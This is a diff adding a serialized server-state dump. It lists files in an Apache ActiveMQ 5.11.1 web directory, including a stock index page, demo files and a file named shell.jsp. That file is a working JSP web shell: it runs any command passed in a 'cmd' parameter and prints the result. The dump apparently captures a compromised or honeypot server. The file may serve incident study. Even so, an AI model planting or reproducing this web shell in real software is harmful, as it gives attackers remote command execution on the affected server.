@@ -1,0 +1,63 @@
+ƒ¤type¬server_stateªfile_state”„¤type©file_data©file_pathÙ'/opt/apache-activemq-5.11.1/webapps/api©file_name©shell.jsp¬file_contentÅ:<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>„¤type©file_data©file_pathÙ'/opt/apache-activemq-5.11.1/webapps/api©file_name¯demo_f7SQa8.bin¬file_contentÄHello world! I'm a demo file.„¤type©file_data©file_pathÙ./opt/apache-activemq-5.11.1/webapps/fileserver©file_nameªindex.html¬file_contentÅµ<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+  
+  http://www.apache.org/licenses/LICENSE-2.0
+  
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<html>
+<head>
+<title>ActiveMQ Console</title>
+</head>
+<body>
+
+<h1>RESTful file access</h1>
+
+<p>
+	This webapp provides RESTful file access.
+</p>
+
+</body>
+</html>
+„¤type©file_data©file_pathÙ./opt/apache-activemq-5.11.1/webapps/fileserver©file_name¯demo_tHUw94.bin¬file_contentÄHello world¨db_state
